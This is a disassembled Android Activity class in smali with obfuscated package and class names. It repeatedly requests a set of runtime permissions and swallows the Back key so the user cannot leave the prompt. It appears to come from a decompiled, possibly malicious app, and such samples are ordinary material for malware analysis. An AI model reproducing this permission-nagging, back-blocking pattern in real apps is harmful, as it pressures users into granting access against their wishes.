.class public Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;
.super Landroid/app/Activity;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/a;

.field b:Lwocwvy/czyxoxmbauu/slsa/b;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/a;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/a;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {p1, p0}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_0

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->finish()V

    :cond_0
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_6

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->d:[Ljava/lang/String;

    const/4 v0, 0x0

    aget-object p1, p1, v0

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    const/16 v1, 0x6f

    if-eqz p1, :cond_1

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->d:[Ljava/lang/String;

    invoke-virtual {p0, p1, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->requestPermissions([Ljava/lang/String;I)V

    :cond_1
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->e:[Ljava/lang/String;

    aget-object p1, p1, v0

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_2

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->e:[Ljava/lang/String;

    invoke-virtual {p0, p1, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->requestPermissions([Ljava/lang/String;I)V

    :cond_2
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->f:[Ljava/lang/String;

    aget-object p1, p1, v0

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_3

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->f:[Ljava/lang/String;

    invoke-virtual {p0, p1, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->requestPermissions([Ljava/lang/String;I)V

    :cond_3
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->g:[Ljava/lang/String;

    aget-object p1, p1, v0

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_4

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->g:[Ljava/lang/String;

    invoke-virtual {p0, p1, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->requestPermissions([Ljava/lang/String;I)V

    :cond_4
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->c:[Ljava/lang/String;

    aget-object p1, p1, v0

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_5

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->c:[Ljava/lang/String;

    invoke-virtual {p0, p1, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->requestPermissions([Ljava/lang/String;I)V

    :cond_5
    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->b:[Ljava/lang/String;

    aget-object p1, p1, v0

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_6

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->a:Lwocwvy/czyxoxmbauu/slsa/a;

    iget-object p1, p1, Lwocwvy/czyxoxmbauu/slsa/a;->b:[Ljava/lang/String;

    invoke-virtual {p0, p1, v1}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->requestPermissions([Ljava/lang/String;I)V

    :cond_6
    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/ncec/sxfl;->finish()V

    return-void
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 v0, 0x4

    if-eq p1, v0, :cond_1

    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result p1

    if-eqz p1, :cond_0

    goto :goto_0

    :cond_0
    const/4 p1, 0x0

    return p1

    :cond_1
    :goto_0
    const/4 p1, 0x1

    return p1
.end method

.method protected onPause()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    return-void
.end method

.method protected onResume()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    return-void
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
